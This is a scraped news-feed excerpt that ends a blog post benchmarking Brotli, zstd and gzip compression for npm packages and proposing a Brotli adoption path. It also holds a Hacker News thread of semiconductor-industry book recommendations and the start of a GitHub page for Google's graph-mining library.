</span></span><span><span> 9</span><span>-rw-r--r-- <span>1</span> jamie users 2.3M Jun <span>16</span> 21:14 npm-9.7.1.tar.zst
</span></span><span><span>10</span><span>-rw-r--r-- <span>1</span> jamie users 2.6M Jun <span>16</span> 20:30 npm-9.7.1.tgz 
</span></span></code></pre></div><p>Wow! With no configuration both Brotli and zstd come out ahead of gzip, but Brotli is the clear winner here. It manages a compression ratio of 0.15 versus zstd’s 0.21. In real terms that means a saving of around 1MB. That doesn’t sound like much, but at 4 million weekly downloads, that would save 4TB of bandwidth per week.</p><h2 id="benchmarking-part-2-electric-boogaloo">Benchmarking part 2: Electric boogaloo</h2><p>The compression ratio is only telling half of the story. Actually, it’s a third of the story, but compression speed isn’t really a concern. Compression of a package only happens once, when a package is published, but decompression happens every time you run <code>npm install</code>. So any time saved decompressing packages means quicker install or build steps.</p><p>To test this, I’m going to use <a href="https://github.com/sharkdp/hyperfine">hyperfine</a>, a command-line benchmarking tool. Decompressing each of the packages I created earlier 100 times should give me a good idea of the relative decompression speed.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>1</span><span>$ hyperfine --runs <span>100</span> --export-markdown hyperfine.md <span>\
</span></span></span><span><span>2</span><span><span></span>  <span>'tar --use-compress-program brotli --extract --file npm-9.7.1.tar.br --overwrite'</span> <span>\
</span></span></span><span><span>3</span><span><span></span>  <span>'tar --use-compress-program zstd --extract --file npm-9.7.1.tar.zst --overwrite'</span> <span>\
</span></span></span><span><span>4</span><span><span></span>  <span>'tar --use-compress-program gzip --extract --file npm-9.7.1.tgz --overwrite'</span>
</span></span></code></pre></div><table><thead><tr><th>Command</th><th>Mean [ms]</th><th>Min [ms]</th><th>Max [ms]</th><th>Relative</th></tr></thead><tbody><tr><td>tar –use-compress-program brotli –extract –file npm-9.7.1.tar.br –overwrite</td><td>51.6 ± 3.0</td><td>47.9</td><td>57.3</td><td>1.31 ± 0.12</td></tr><tr><td>tar –use-compress-program zstd –extract –file npm-9.7.1.tar.zst –overwrite</td><td>39.5 ± 3.0</td><td>33.5</td><td>51.8</td><td>1.00</td></tr><tr><td>tar –use-compress-program gzip –extract –file npm-9.7.1.tgz –overwrite</td><td>47.0 ± 1.7</td><td>44.0</td><td>54.9</td><td>1.19 ± 0.10</td></tr></tbody></table><p>This time zstd comes out in front, followed by gzip and Brotli. This makes sense, as “real-time compression” is one of the big features that is touted in <a href="https://facebook.github.io/zstd/">zstd’s documentation.</a> While Brotli is 31% slower compared to zstd, in real terms it’s only 12ms. And compared to gzip, it’s only 5ms slower. To put that into context, you’d need a more than 1Gbps connection to make up for the 5ms loss it has in decompression compared with the 1MB it saves in package size.</p><h2 id="benchmarking-part-3-this-time-its-serious">Benchmarking part 3: This time it’s serious</h2><p>Up until now I’ve just been looking at Brotli and zstd’s default settings, but both have a lot of knobs and dials that you can adjust to change the compression ratio and compression or decompression speed. Thankfully, the industry standard <a href="https://github.com/inikep/lzbench">lzbench</a> has got me covered. It can run through all of the different quality levels for each compressor, and spit out a nice table with all the data at the end.</p><p>But before I dive in, there are a few caveats I should point out. The first is that lzbench isn’t able to compress an entire directory like <code>tar</code> , so I opted to use <code>lib/npm.js</code> for this test. The second is that lzbench doesn’t include the gzip tool. Instead it uses zlib, the underlying gzip library. The last is that the versions of each compressor aren’t quite current. The latest version of zstd is 1.5.5, released on April 4th 2023, whereas lzbench uses version 1.4.5, released on May 22nd 2020. The latest version of Brotli is 1.0.9, released on August 27th 2020, whereas lzbench uses a version released on October 1st 2019.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>1</span><span>$ lzbench -o1 -ezlib/zstd/brotli package/lib/npm.js
</span></span></code></pre></div><details><summary>Click to expand results</summary><table><thead><tr><th>Compressor name</th><th>Compression</th><th>Decompress.</th><th>Compr. size</th><th>Ratio</th><th>Filename</th></tr></thead><tbody><tr><td>memcpy</td><td>117330 MB/s</td><td>121675 MB/s</td><td>13141</td><td>100.00</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -1</td><td>332 MB/s</td><td>950 MB/s</td><td>5000</td><td>38.05</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -2</td><td>382 MB/s</td><td>965 MB/s</td><td>4876</td><td>37.11</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -3</td><td>304 MB/s</td><td>986 MB/s</td><td>4774</td><td>36.33</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -4</td><td>270 MB/s</td><td>1009 MB/s</td><td>4539</td><td>34.54</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -5</td><td>204 MB/s</td><td>982 MB/s</td><td>4452</td><td>33.88</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -6</td><td>150 MB/s</td><td>983 MB/s</td><td>4425</td><td>33.67</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -7</td><td>125 MB/s</td><td>983 MB/s</td><td>4421</td><td>33.64</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -8</td><td>92 MB/s</td><td>989 MB/s</td><td>4419</td><td>33.63</td><td>package/lib/npm.js</td></tr><tr><td>zlib 1.2.11 -9</td><td>95 MB/s</td><td>986 MB/s</td><td>4419</td><td>33.63</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -1</td><td>594 MB/s</td><td>1619 MB/s</td><td>4793</td><td>36.47</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -2</td><td>556 MB/s</td><td>1423 MB/s</td><td>4881</td><td>37.14</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -3</td><td>510 MB/s</td><td>1560 MB/s</td><td>4686</td><td>35.66</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -4</td><td>338 MB/s</td><td>1584 MB/s</td><td>4510</td><td>34.32</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -5</td><td>275 MB/s</td><td>1647 MB/s</td><td>4455</td><td>33.90</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -6</td><td>216 MB/s</td><td>1656 MB/s</td><td>4439</td><td>33.78</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -7</td><td>140 MB/s</td><td>1665 MB/s</td><td>4422</td><td>33.65</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -8</td><td>101 MB/s</td><td>1714 MB/s</td><td>4416</td><td>33.60</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -9</td><td>97 MB/s</td><td>1673 MB/s</td><td>4410</td><td>33.56</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -10</td><td>97 MB/s</td><td>1672 MB/s</td><td>4410</td><td>33.56</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -11</td><td>37 MB/s</td><td>1665 MB/s</td><td>4371</td><td>33.26</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -12</td><td>27 MB/s</td><td>1637 MB/s</td><td>4336</td><td>33.00</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -13</td><td>20 MB/s</td><td>1601 MB/s</td><td>4310</td><td>32.80</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -14</td><td>18 MB/s</td><td>1582 MB/s</td><td>4309</td><td>32.79</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -15</td><td>18 MB/s</td><td>1582 MB/s</td><td>4309</td><td>32.79</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -16</td><td>9.03 MB/s</td><td>1556 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -17</td><td>8.86 MB/s</td><td>1559 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -18</td><td>8.86 MB/s</td><td>1558 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -19</td><td>8.86 MB/s</td><td>1559 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -20</td><td>8.85 MB/s</td><td>1558 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -21</td><td>8.86 MB/s</td><td>1559 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>zstd 1.4.5 -22</td><td>8.86 MB/s</td><td>1589 MB/s</td><td>4305</td><td>32.76</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -0</td><td>604 MB/s</td><td>813 MB/s</td><td>5182</td><td>39.43</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -1</td><td>445 MB/s</td><td>775 MB/s</td><td>5148</td><td>39.18</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -2</td><td>347 MB/s</td><td>947 MB/s</td><td>4727</td><td>35.97</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -3</td><td>266 MB/s</td><td>936 MB/s</td><td>4645</td><td>35.35</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -4</td><td>164 MB/s</td><td>930 MB/s</td><td>4559</td><td>34.69</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -5</td><td>135 MB/s</td><td>944 MB/s</td><td>4276</td><td>32.54</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -6</td><td>129 MB/s</td><td>949 MB/s</td><td>4257</td><td>32.39</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -7</td><td>103 MB/s</td><td>953 MB/s</td><td>4244</td><td>32.30</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -8</td><td>84 MB/s</td><td>919 MB/s</td><td>4240</td><td>32.27</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -9</td><td>7.74 MB/s</td><td>958 MB/s</td><td>4237</td><td>32.24</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -10</td><td>4.35 MB/s</td><td>690 MB/s</td><td>3916</td><td>29.80</td><td>package/lib/npm.js</td></tr><tr><td>brotli 2019-10-01 -11</td><td>1.59 MB/s</td><td>761 MB/s</td><td>3808</td><td>28.98</td><td>package/lib/npm.js</td></tr></tbody></table></details><p>This pretty much confirms what I’ve shown up to now. zstd is able to provide faster decompression speed than either gzip or Brotli, and slightly edge out gzip in compression ratio. Brotli, on the other hand, has comparable decompression speeds and compression ratio with gzip at lower quality levels, but at levels 10 and 11 it’s able to edge out both gzip and zstd’s compression ratio.</p><h2 id="everything-is-derivative">Everything is derivative</h2><p>Now that I’ve finished with benchmarking, I need to step back and look at my original idea of replacing gzip as npm’s compression standard. As it turns out, Evan Hahn had a similar idea in 2022 and proposed <a href="https://github.com/npm/rfcs/pull/595">an npm RFC</a>. He proposed using Zopfli, a backwards-compatible gzip compression library, and Brotli’s older (and cooler 😎) sibling. Zopfli is able to produce smaller artifacts with the trade-off of a much slower compression speed. In theory an easy win for the npm ecosystem. And if you watch <a href="https://www.youtube.com/watch?v=sDsq_i1Q4Lc&amp;t=170s">the RFC meeting recording</a> or read <a href="https://github.com/npm/rfcs/blob/main/meetings/2022-06-01.md#pr-595-propose-backwards-compatible-improvements-to-compression---evanhahn">the meeting notes</a>, everyone seems hugely in favour of the proposal. However, the one big roadblock that prevents this RFC from being immediately accepted, and ultimately results in it being abandoned, is the lack of a native JavaScript implementation.</p><p>Learning from this earlier RFC and my results from benchmarking Brotli and zstd, what would it take to build a strong RFC of my own?</p><h2 id="putting-it-all-together">Putting it all together</h2><p>Both Brotli and zstd’s reference implementations are written in C. And while there are a lot of ports on the npm registry using Emscripten or WASM, Brotli has an implementation in <a href="https://nodejs.org/api/zlib.html">Node.js’s zlib module</a>, and has done <a href="https://nodejs.org/en/blog/release/v10.16.0">since Node.js 10.16.0</a>, released in May 2019. I opened <a href="https://github.com/nodejs/node/issues/48412">an issue in Node.js’s GitHub repo</a> to add support for zstd, but it’ll take a long time to make its way into an LTS release, nevermind the rest of npm’s dependency chain. I was already leaning towards Brotli, but this just seals the deal.</p><p>Deciding on an algorithm is one thing, but implementing it is another. npm’s current support for gzip compression ultimately comes from Node.js itself. But the dependency chain between npm and Node.js is long and slightly different depending on if you’re packing or unpacking a package.</p><p>The dependency chain for packing, as in <code>npm pack</code> or <code>npm publish</code>, is:</p><p><a href="https://www.npmjs.com/package/npm">npm</a> → <a href="https://www.npmjs.com/package/libnpmpack">libnpmpack</a> → <a href="https://www.npmjs.com/package/pacote">pacote</a> → <a href="https://www.npmjs.com/package/tar">tar</a> → <a href="https://www.npmjs.com/package/minizlib">minizlib</a> → <a href="https://nodejs.org/api/zlib.html">zlib</a> (Node.js)</p><p>But the dependency chain for unpacking (or ‘reifying’ as npm calls it), as in <code>npm install</code> or <code>npm ci</code> is:</p><p><a href="https://www.npmjs.com/package/npm">npm</a> → <a href="https://www.npmjs.com/package/@npmcli/arborist">@npmcli/arborist</a> → <a href="https://www.npmjs.com/package/pacote">pacote</a> → <a href="https://www.npmjs.com/package/tar">tar</a> → <a href="https://www.npmjs.com/package/minizlib">minizlib</a> → <a href="https://nodejs.org/api/zlib.html">zlib</a> (Node.js)</p><p>That’s quite a few packages that need to be updated, but thankfully the first steps have already been taken. Support for Brotli was added to minizlib 1.3.0 back in September 2019. I built on top of that and <a href="https://github.com/isaacs/node-tar/pull/391">contributed Brotil support</a> to <code>tar</code>. That is now <a href="https://github.com/isaacs/node-tar/blob/main/CHANGELOG.md#62">available in version 6.2.0</a>. It may take a while, but I can see a clear path forward.</p><p>The final issue is backwards compatibility. This wasn’t a concern with Evan Hahn’s RFC, as Zopfli generates backwards-compatible gzip files. However, Brotli is an entirely new compression format, so I’ll need to propose a very careful adoption plan. The process I can see is:</p><ol><li>Support for packing and unpacking is added in a minor release of the current version of npm<ol><li>Unpacking using Brotli is handled transparently</li><li>Packing using Brotli is disabled by default and only enabled if one of the following are true:<ol><li>The <code>engines</code> field in <code>package.json</code> is set to a version of npm that supports Brotli</li><li>The <code>engines</code> field in <code>package.json</code> is set to a version of node that bundles a version of npm that supports Brotli</li><li>Brotli support is explicitly enabled in <code>.npmrc</code></li></ol></li></ol></li><li>Packing using Brotli is enabled by default in the next major release of npm after the LTS version of Node.js that bundles it goes out of support</li></ol><p>Let’s say that Node.js 22 comes with npm 10, which has Brotli support. Node.js 22 will stop getting LTS updates in April 2027. Then, the next major version of npm after that date should enable Brotli packing by default.</p><p>I admit that this is an <em>incredibly</em> long transition period. However, it will guarantee that if you’re using a version of Node.js that is still being supported, there will be no visible impact to you. And it still allows early adopters to opt-in to Brotli support. But if anyone has other ideas about how to do this transition, I am open to suggestions.</p><h2 id="whats-next">What’s next?</h2><p>As I wrap up my exploration into npm compression, I must admit that my journey has only just begun. To push the boundaries further, there are a lot more steps. First and foremost, I need to do some more extensive benchmarking with <a href="https://socket.dev/npm/category/popular">the top 250 most downloaded npm packages</a>, instead of focusing on a single package. One that’s complete, I need to draft an npm RFC and seek feedback from the wider community. If you’re interested in helping out, or just want to see how it’s going, you can follow me on Mastodon at <a href="https://infosec.exchange/@JamieMagee">@<span data-cfemail="e0aa818d8985ad81878585a0898e868f938583ce85988388818e8785">[email&nbsp;protected]</span></a>, or on Twitter at <a href="https://twitter.com/Jamie_Magee">@Jamie_Magee</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Best books to understand semiconductor business? (113 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=37754287</link>
            <guid>37754287</guid>
            <pubDate>Tue, 03 Oct 2023 16:44:23 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=37754287">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="37759135"><td></td></tr>
            <tr id="37756840"><td></td></tr>
                <tr id="37757375"><td></td></tr>
                <tr id="37757735"><td></td></tr>
                <tr id="37757800"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_37757800" href="https://news.ycombinator.com/vote?id=37757800&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>Most of the stuff you'll find on the web is pretty old. In most industries it's not really a big issue-- waste management and industrial pump manufacturers don't change that quickly. But obviously in semis it matters more.<p>If you know anyone who works at a hedge fund or investment bank, you can ask them to grab some primers for you. All the big banks produce them for the major industries they cover. But they usually watermark every page of the report with the name of the client to discourage people from sharing more widely.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                              <tr id="37755054"><td></td></tr>
                <tr id="37757105"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37757105" href="https://news.ycombinator.com/vote?id=37757105&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>I'm cautious with Asianometry. I watched some about a year ago and he wasn't completely accurate. I don't remember which videos now, but letting people know they should consume more than just Asianometry to corroborate facts.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37755294"><td></td></tr>
                <tr id="37757292"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_37757292" href="https://news.ycombinator.com/vote?id=37757292&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>Chip War focuses a lot on the personalities and comparatively little on the business/industry itself. It provides an entertaining read, I guess, but especially in the second half, I found myself reading on just to finish the book, rather than out of a desire/expectation to get informed.<p>Some representative paragraphs from the book. Some people probably like this style, but it's not for me.</p><p>&gt; In 1985, Taiwan's powerful minister K. T. Li called Morris Chang into his office in Taipei. Nearly two decades had passed since Li had helped convince Texas Instruments to build its first semiconductor facility on the island. In the twenty years since then, Li had forged close ties with Texas Instrument's leaders, visiting Pat Haggerty and Morris Chang whenever he was in the U.S. and convincing other electronics firms to follow TI and open factories in Taiwan. In 1985, he hired Chang to lead Taiwan's chip industry. "We want to promote a semiconductor industry in Taiwan," he told Chang. "Tell me," he continued, "how much money you need."</p><p>...</p><p>&gt; Lee Byung-Chul could make a profit selling almost anything. Born in 1910, just a year after Jack Simplot, Lee launched his business career in March 1938, a time when his native Korea was part of Japan's empire, at war with China and soon with the United States. Lee's first products were dried fish and vegetables, which he gathered from Korea and shipped to northern China to feed Japan's war machine. Korea was an impoverished backwater, with no industry or technology, but Lee was already dreaming of building a business that would be "big, strong, and eternal," he declared. He would turn Samsung into a semiconductor superpower thanks to two influential allies: America's chip industry and the South Korean state. A key part of Silicon Valley's strategy to outmaneuver the Japanese was to find cheaper sources of supply in Asia. Lee decided this was a role Samsung could easily play.</p><p>...</p><p>&gt; Vladimir Vetrov was a KGB spy, but his life felt more like a Chekhov story than a James Bond film. His KGB work was bureaucratic, his mistress far from a supermodel, and his wife more affectionate toward her shih tzu puppies than toward him. By the end of the 1970s, Vetrov's career, and his life, had hit a dead end. He despised his desk job and was ignored by his bosses. He detested his wife, who was having an affair with one of his friends. For recreation, he escaped to his log cabin in a village north of Moscow, which was so rustic that there was no electricity. Or he'd simply stay in Moscow and get drunk.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="37755739"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37755739" href="https://news.ycombinator.com/vote?id=37755739&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>Adding that if you prefer to read (since the question is about best books), asianometry's patreon includes transcripts.  Plus it's always good to support someone doing good work.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37755233"><td></td></tr>
                <tr id="37755741"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_37755741" href="https://news.ycombinator.com/vote?id=37755741&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>That ARM video is useful because it somewhat ties together lots of things in a short-ish video. But I hate the breathless style and the video confuses and mistakes many things. Also what's the point of that silly [the iPhone is british, Fitbit is british, DJI drones are British...]?<p>In the end it is not about the semiconductor business - just hits several aspects of it at the periphery.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                        <tr id="37755608"><td></td></tr>
                <tr id="37756012"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37756012" href="https://news.ycombinator.com/vote?id=37756012&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>2nd this. Great mix of journalism, criticism and deep technical insight while being accessible people not in the industry.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="37756391"><td></td></tr>
            <tr id="37754452"><td></td></tr>
                <tr id="37754929"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37754929" href="https://news.ycombinator.com/vote?id=37754929&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>I've read this and it gives a pretty good overview of the history as well as current events surrounding the semiconductor industry. I think it gives a good high-level overview so you'll have the foundation to dig deeper. 
I don't think that this book by itself would be enough to understand the semiconductor business, but it's a great place to start to get acclimated.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37757299"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37757299" href="https://news.ycombinator.com/vote?id=37757299&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>+1. I have only finished around ~20% of the book - but it's been really informative covering a wide range of topics from early technical innovations, to  to the companies involved like Fairchild, TI, Intel, Sony, TSMC etc (and by extension the nations involved US, Japan, Russia, Taiwan etc)</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37755745"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37755745" href="https://news.ycombinator.com/vote?id=37755745&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>Came here to say this.  It's a fabulous history and easily one of the best and most informative books I read last year.  It's not necessarily going to teach you much about the current "business" per se, but it's a must-read for the history and has quite a bit about the current global state of affairs, especially re PRC/ROC, and state of the technology.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37755676"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37755676" href="https://news.ycombinator.com/vote?id=37755676&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>After reading Chip War I read Conquering the Electron by Eric Brach and Derek Cheung. Very good book that goes into a bit more detail than Chip War. Chip War focuses more on the geopolitics than the science.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37755551"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37755551" href="https://news.ycombinator.com/vote?id=37755551&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>I'm about 90% through this book that I picked up based on some other HN comment I had read. I would highly recommend it</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37756702"><td></td></tr>
            <tr id="37757566"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_37757566" href="https://news.ycombinator.com/vote?id=37757566&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>-1: dude was wrong about everything, missed the role of software and computer engineering.<p>1. China rapidly catching up</p><p>2. Companies can produce competitive offerings with old manufacturing processes</p><p>He took a manufacturing heavy view, but actually open archs like RISC-V or ARM's china division defecting provided avenues to make competitive offerings with last generation technology.</p><p>fastest chip today runs on 4 year old silicon: <a href="https://www.eetimes.com/groq-demos-fast-llms-on-4-year-old-silicon/" rel="nofollow noreferrer">https://www.eetimes.com/groq-demos-fast-llms-on-4-year-old-s...</a>
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="37755702"><td></td></tr>
            <tr id="37756043"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_37756043" href="https://news.ycombinator.com/vote?id=37756043&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>Andy Grove: The Life and Times of an American<p><a href="https://www.amazon.com/Andy-Grove-Life-Times-American/dp/1591841399/ref=sr_1_1?keywords=Andy+Grove%3A+The+Life+and+Times+of+an+American&amp;s=books&amp;sr=1-1" rel="nofollow noreferrer">https://www.amazon.com/Andy-Grove-Life-Times-American/dp/159...</a></p><p>This appears to be out of print. I read it a long time ago when it was new. I enjoyed the book.</p><p>One of the things that I remember from it was how Intel really overestimated how quickly video calls would take off. They thought that video calls would be the "killer app" for desktop computers in the late 1990s / early 2000s.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="37758144"><td></td></tr>
            <tr id="37756527"><td></td></tr>
            <tr id="37754413"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_37754413" href="https://news.ycombinator.com/vote?id=37754413&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>If you’re interested in the history then I recently read and mostly liked The Chip by TR Reid. I’d like to find something more up to date than that. Lots of buzz around Chip War by Chris Miller. I haven’t read it.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37756045"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_37756045" href="https://news.ycombinator.com/vote?id=37756045&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>The Idea Factory
Book by Jon Gertner<p>The Idea Factory: Bell Labs and the Great Age of American Innovation is a 2012 book by Jon Gertner that describes the history of Bell Labs, the research and development wing of AT&amp;T, as well as many of its eccentric personalities, such as Claude Shannon and William Shockley. It is Gertner's first published book.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="37755804"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_37755804" href="https://news.ycombinator.com/vote?id=37755804&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><br><div>
                  <p><span>Two that I found really helpful were The Big Score and The Intel Trinity by Michael Malone. Both cover the earlier years, but great history.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="37756156"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_37756156" href="https://news.ycombinator.com/vote?id=37756156&amp;how=up&amp;goto=item%3Fid%3D37754287"></a></center>    </td><td><p><span>Offering this title for asking opinions of it more than recommendation, as I've not yet read it:<p>'Crystal Fire: The Invention of the Transistor and the Birth of the Information Age', Riordan.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="37755757"><td></td></tr>
            <tr id="37755525"><td></td></tr>
            <tr id="37758575"><td></td></tr>
            <tr id="37756022"><td></td></tr>
            <tr id="37755863"><td></td></tr>
            </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google open-sources their graph mining library (260 pts)]]></title>
            <link>https://github.com/google/graph-mining</link>
            <guid>37753442</guid>
            <pubDate>Tue, 03 Oct 2023 15:46:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/google/graph-mining">https://github.com/google/graph-mining</a>, See on <a href="https://news.ycombinator.com/item?id=37753442">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-turbo-body="">
      


    <div>
      <p><a href="#start-of-content">Skip to content</a>
      <span data-view-component="true">
    <span data-view-component="true"></span>
</span></p><header role="banner" data-color-mode="light" data-light-theme="light" data-dark-theme="dark">
  

  <div>
    <div>
      <a href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
        
      </a>

        <div>
          <p><a href="https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&amp;source=header-repo" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/google/graph-mining&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="77262e073ade2e82c16866bbb7be3f8bfd1e2a2aca883e57ee571494d2f12129">
            Sign&nbsp;up
          </a>
        </p></div>

      
    </div>


    <div>
          <nav aria-label="Global">
            <ul>
                <li>
      
      <div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Actions&quot;,&quot;label&quot;:&quot;ref_cta:Actions;&quot;}" href="https://github.com/features/actions">
      
      <div>
        <p>Actions</p><p>
        Automate any workflow
      </p></div>

    
</a></li>

                <li>
